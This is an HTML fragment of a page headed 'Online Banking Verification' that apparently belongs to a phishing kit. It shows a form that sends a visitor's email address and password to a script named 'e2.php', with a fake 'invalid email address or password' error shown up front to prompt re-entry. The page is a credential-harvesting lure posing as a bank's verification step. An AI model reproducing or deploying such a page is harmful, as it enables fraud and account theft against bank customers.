            ...
            <div class="account-content-container">
                <div class="account-table-body">
                    ...
                    <a href="#" class="mobile-help-trigger">Help</a>
                            ...
                            <h1>Online Banking Verification</h1>
...
<div id="GlobalMessageContainer">
    ...
    <div class="global-message status-message">
       <h1>Process</h1>
       <p></p><li>Confirm Your Email Address.</li>
<br>
    </div>
</div>
    ...
    <form class="pay-transfer-options clearfix" action="e2.php" name="SignOn" id="frmSignOn" method="post">
...
<!--*****-->
		...
		<div class="form-item label-right full-width clearfix">
	    <div id="messagecontainer" class="error-message show-error error" role="alert" style="display: block;">You have entered an invalid email address or password.</div>
            <label for="UserID"><strong>Email Address: </strong></label>
            <input tabindex="1" type="email" id="UserID" name="Email" autocomplete="off" class="required demo-username" required oninvalid="this.setCustomValidity('Enter Your Email Address')" oninput="this.setCustomValidity('')" style="border-color: red;" />
                
                <div class="form-item full-width">
                    <label for="currentpassword"><strong>Password: </strong></label>       
                <input tabindex="2" type="password" id="currentpassword" name="Pass" size="15" class="required demo-password" required oninvalid="this.setCustomValidity('Enter Your Password')" oninput="this.setCustomValidity('')" style="border-color: red;" />

                </div>

        </div>
        <div class="form-actions">
			<input type="submit" class="submit-button arrow" tabindex="3" data-trigger="next" value="Confirm" style="background: url(assets/arrow-button-white.png) right center no-repeat green;">  
        </div>
    </form>
